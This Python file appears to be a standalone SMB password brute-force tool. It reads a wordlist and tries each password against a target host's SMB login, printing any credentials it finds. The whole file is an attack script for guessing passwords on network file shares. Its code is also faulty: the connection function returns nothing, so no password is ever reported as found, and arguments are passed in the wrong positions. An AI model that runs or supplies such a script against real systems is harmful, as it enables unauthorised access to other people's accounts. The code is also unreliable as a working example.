from smb.SMBConnection import SMBConnection
from time import sleep

def smbConnection(server_ip, username, password, port, client_machine):
    
    try:
        conn = SMBConnection(username, password, client_machine, server_ip, use_ntlm_v2=True)
        assert conn.connect(server_ip, port)
    except Exception:
        print("Something went wrong. Try again!")
    conn.close()

def smbBruteForce(address, username, passlist, port, delay):
    password_list = open(passlist, "r" )
    for i in password_list.readlines():
        password = i.strip("\n")
        try:
            response = smbConnection(address, username, password, port, delay)
            if response == 0:
                print("[*] Username: %s | [*] Password found: %s\n" % (username, password))
            elif response == 1:
                print("[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password))
                sleep(delay)
            elif response == 2:
                print("[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]")
                exit()
        except Exception as e:
            print(e)
            pass
        password_list.close()